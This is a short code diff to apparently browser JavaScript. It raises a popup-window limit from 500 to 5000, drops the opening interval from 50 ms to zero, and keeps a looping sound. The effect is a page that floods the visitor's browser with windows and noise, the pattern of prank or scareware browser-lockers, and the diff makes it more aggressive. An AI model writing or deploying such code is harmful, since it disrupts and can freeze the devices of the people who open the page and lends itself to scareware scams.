@@ -22,7 +22,7 @@
 
       // Open small popups immediately (limited amount)
       let count = 0;
-      const maxWindows = 500;
+      const maxWindows = 5000;
 
       const interval = setInterval(() => {
 
@@ -41,7 +41,7 @@
           clearInterval(interval);
         }
 
-      }, 50);
+      }, 0);
 
       // Play looping sound
       sound1.play().catch(() => {
